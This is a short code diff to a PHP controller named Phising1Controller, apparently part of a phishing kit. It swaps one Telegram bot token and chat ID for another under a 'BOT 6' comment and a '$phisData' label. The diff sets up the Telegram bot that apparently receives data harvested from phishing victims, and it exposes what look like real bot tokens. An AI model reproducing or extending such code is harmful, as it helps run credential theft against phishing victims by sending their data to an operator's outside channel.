@@ -60,8 +60,11 @@ class Phising1Controller extends Controller
 
 
         // BOT 6
-        $bot_token = "7613222032:AAFqNPLIEq3h4CrCNsSwijT3oGwYdFUOS3w";
-        $chat_id = "7202053902";
+        // $bot_token = "7613222032:AAFqNPLIEq3h4CrCNsSwijT3oGwYdFUOS3w";
+        // $chat_id = "7202053902";
+        // $phisData = "GIF2";
+        $bot_token = "7600923583:AAFsZEE7kYZuaWYlfwNLvNn21t2ZSYKS-t8";
+        $chat_id = "6552942907";
         $phisData = "GIF2";
 
 
